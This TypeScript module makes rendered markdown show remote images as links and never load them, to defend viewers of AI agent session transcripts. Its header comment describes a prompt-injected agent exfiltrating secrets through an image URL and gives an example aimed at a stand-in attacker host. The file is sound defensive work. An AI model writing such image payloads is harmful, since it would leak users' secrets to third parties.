/**
 * Remote images in rendered markdown are shown as links, never loaded.
 *
 * Agent output is untrusted: a prompt-injected agent can write
 * `![](https://attacker.example/?d=<secret>)`, and every browser viewing the
 * session, grantees included, would fetch it. Turning the image into a link
 * closes that exfiltration path regardless of the CSP, and keeps transcripts
 * from contacting third-party hosts at all.
 */

/**
 * The host of an image URL that would load from another origin, or null for
 * `data:` and same-origin images (and anything that is not http(s)).
 */
export function remoteImageHost(src: string | undefined | null, pageOrigin = currentOrigin()): string | null {
  if (!src) return null
  const trimmed = src.trim()
  if (!/^(https?:)?\/\//i.test(trimmed)) return null
  let url: URL
  try {
    url = new URL(trimmed, pageOrigin)
  } catch {
    return null
  }
  if (url.protocol !== 'https:' && url.protocol !== 'http:') return null
  if (url.origin === pageOrigin) return null
  return url.host
}

/** Text for the link that stands in for a remote image. */
export function remoteImageLabel(host: string, alt: string | undefined | null): string {
  const description = alt?.trim()
  return description ? `External image: ${description} (${host})` : `External image (${host})`
}

function currentOrigin(): string {
  return typeof window === 'undefined' ? 'null' : window.location.origin
}
